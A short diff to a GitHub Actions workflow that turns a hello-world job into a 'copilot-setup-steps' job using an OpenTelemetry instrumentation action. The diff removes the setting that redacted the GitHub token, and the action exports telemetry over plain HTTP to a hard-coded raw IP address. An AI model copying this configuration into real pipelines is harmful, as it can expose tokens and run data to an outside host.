@@ -1,19 +1,16 @@
 
-name: Test
-
 on:
   push:
-
+    paths:
+      - .github/workflows/copilot-setup-steps.yml
 jobs:
-
-  hello-world:
+  copilot-setup-steps:
     runs-on: ubuntu-latest
     steps:
       - uses: plengauer/opentelemetry-github/actions/instrument/job@
         env:
           OTEL_EXPORTER_OTLP_ENDPOINT: http://135.232.224.86:8080
-        with:
-          secrets_to_redact: '["${{ github.token }}"]'
-      - run: echo hello world
+      - run: |
+          :
     permissions:
       actions: read
